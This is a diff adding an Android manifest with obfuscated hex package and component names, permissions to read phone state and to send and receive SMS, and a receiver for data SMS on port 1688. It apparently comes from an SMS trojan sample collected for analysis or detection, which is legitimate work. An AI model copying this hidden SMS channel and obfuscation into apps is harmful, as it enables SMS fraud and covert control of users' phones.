@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:ns0="http://schemas.android.com/apk/res/android" ns0:sharedUserId="ZeLvGNUBrzFWXVPx.uid.shared" ns0:versionCode="1" ns0:versionName="1.0" package="com.adc58a797.ac31b3236.a740675ee" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
+    <uses-permission ns0:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission ns0:name="android.permission.SEND_SMS"/>
+    <uses-permission ns0:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission ns0:name="android.permission.INTERNET"/>
+    <application ns0:icon="@drawable/icon" ns0:label="@string/app_name">
+        <activity ns0:label="@string/app_name" ns0:name=".a90fa2bb3" ns0:taskAffinity="aRBTUSKs.aUMzSWyQ">
+            <intent-filter>
+                <action ns0:name="android.intent.action.MAIN"/>
+                <category ns0:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity ns0:name=".ae1e1d3d4ulesActivity" ns0:taskAffinity="aRBTUSKs.aUMzSWyQ"/>
+        <activity ns0:name=".adf608587" ns0:taskAffinity="aRBTUSKs.aUMzSWyQ"/>
+        <activity ns0:name="QuestionActivity" ns0:taskAffinity="aRBTUSKs.aUMzSWyQ"/>
+        <activity ns0:name="MemberActivity" ns0:taskAffinity="aRBTUSKs.aUMzSWyQ"/>
+        <receiver ns0:name=".a18b43c6a.a27adad85">
+            <intent-filter>
+                <action ns0:name="android.intent.action.DATA_SMS_RECEIVED"/>
+                <data ns0:port="1688"/>
+                <data ns0:scheme="sms"/>
+            </intent-filter>
+        </receiver>
+        <service ns0:enabled="true" ns0:name=".a10cd395c.a7000a234"/>
+    </application>
+</manifest>
